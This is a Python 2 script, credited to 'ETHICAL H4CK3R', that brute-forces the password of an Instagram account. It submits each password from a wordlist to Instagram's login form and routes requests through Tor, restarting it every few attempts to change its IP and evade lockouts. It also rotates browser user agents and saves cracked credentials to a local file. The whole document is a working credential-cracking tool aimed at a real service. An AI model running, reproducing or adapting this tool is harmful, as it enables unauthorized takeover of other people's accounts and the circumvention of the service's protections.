#!/usr/bin/env python
#
# @Author: ETHICAL H4CK3R
# Distro:  Kali Linux 2.0 
# 
# TODO: Brute Force Instagram Accounts
#
import os
import time
import socks
import socket
import signal
import random
import datetime
import cookielib
import subprocess 

from Core.art import Colors
from Core.art import Display

def Setup_Mechanize():  
  global Br
  Br=mechanize.Browser(history=Void())
  CJ=cookielib.LWPCookieJar()
  Br.set_cookiejar(CJ)
  Br.set_handle_equiv(True)
  Br.set_handle_referer(True)
  Br.set_handle_robots(False)
  Br.set_handle_refresh(True)
  Br.set_handle_redirect(True)
  Br.addheaders=[('User-agent',random.choice(Agents))]
  Br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)

class Void(object): 
 def add(self, *args, **kargs):pass 
 def clear(self):pass 

def Brute_Force(Email,Pass):
  try:
   Br.select_form(nr=0)
   Br.form['username']=Email
   Br.form['password']=Pass
   Br.submit()
   if Br.geturl() != Url:
    Access_Granted(Email,Pass)
  except KeyboardInterrupt:Exit()
   
def Connect(address, timeout=None, source_address=None):
  sock=socks.socksocket()
  sock.connect(address)
  return sock

def Obtain_Proxy_IP():
  socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,'127.0.0.1',9050)
  socket.socket=socks.socksocket
  socket.Connect=Connect
  
def User_Input(Logins=[]):
  subprocess.call(['clear']);print art
  for i in range(11):print'\n'
  try:
   Email=raw_input('{}[{}-{}]{} Enter [ Email || Username ] :{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
   Passlist=raw_input('{}[{}-{}]{} Enter Passlist:{} '.format(Red,Green,Red,White,Green));time.sleep(0.7)
   return Email,Passlist
  except KeyboardInterrupt:
   Exit()

def Exit():  
  print '{}'.format(Red)
  subprocess.call(['service','tor','stop'])
  os.kill(os.getpid(),signal.SIGTERM)
  exit() 
      
def Install_Tor():
  subprocess.call(['clear'])
  time.sleep(0.7)
  print '[!] Installing Tor ...';time.sleep(0.7);
  subprocess.call(['apt-get','update'])
  subprocess.call(['apt-get','install','tor','-y'])
  subprocess.call(['apt-get','install','--fix-missing'])

def Refresh():
  try:  
   Restart_Tor()
   Obtain_Proxy_IP()
   Setup_Mechanize()
   time.sleep(3)
  except KeyboardInterrupt:
   Exit()

def Restart_Tor():
  subprocess.call(['service','tor','restart'])
  time.sleep(1)

def Message(Email):
  subprocess.call(['clear'])
  print art
  for i in range(10):print'\n'
  print '{}[{}!{}]{} Brute Force In Progress ...{}'.format(Red,Yellow,Red,Yellow,White)
  print '{}[{}-{}]{} Email: {}{}{}'.format(Red,Yellow,Red,White,Yellow,Email,White)
  print '{}[{}-{}]{} Pass:  {}{}{}'.format(Red,Yellow,Red,White,Yellow,passwrd,White)
  print '{}[{}*{}]{} Attempts: {}{}{}'.format(Red,Yellow,Red,White,Yellow,attempt,White)

def Current_Time():
  now  = datetime.datetime.now()
  time = now.strftime("%Y-%m-%d %H:%M")
  date = time[:10]
  mins = time[-3:]
  hrs  = int(time[-5:-3])
  zone = 'am'

  if hrs > 12:
   hrs  = hrs-12
   zone = 'pm'

  return '{} {}{} {}'.format(date,hrs,mins,zone)

def Access_Granted(email,password):
  with open('Cracked.txt','a') as File:
   File.write('Username: {}\nPassword: {}\nTime Started: {}\nTime Accessed: {}\n\n'.format(email,password,Time_Started,Current_Time()))
  Exit()
  
if __name__ == '__main__':
  if os.getuid():
   exit('{}[{}!{}]{} Root Access Required'.format(Red,Yellow,Red,Blue))

  Red,Blue,Green,Yellow,White=Colors[0],Colors[1],Colors[2],Colors[3],Colors[4]

  art=Display()
  Attempt,attempt=1,1
  Url='https://www.instagram.com/accounts/login/?force_classic_login'
  
  Agents=[( 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36',
	      'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36',
	      'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36' )]
 
  if not os.path.exists('/usr/bin/tor'):Install_Tor()
  from Core.Conf import ReWrite
  ReWrite()
  
  try:import mechanize
  except ImportError: 
   call(['clear'])
   print '[!] Installing Mechanize ...';time.sleep(0.9);
   call(['pip','install','mechanize'])
  finally:import mechanize

  Input = User_Input()
  Email = Input[0]
  Pass  = Input[1]
 
  ReWrite();Refresh();Br.open(Url)
  Time_Started=Current_Time()
  with open(Pass,'r') as File:
   for passwrd in File:
    if not len(passwrd):continue 
    try:
     passwrd = passwrd.replace('\n','')
     Message(Email)
     Brute_Force(Email,passwrd)
     if Attempt==3:Refresh();Br.open(Url);Attempt=0
     Attempt+=1
     attempt+=1
    except KeyboardInterrupt:Exit()
  Exit()
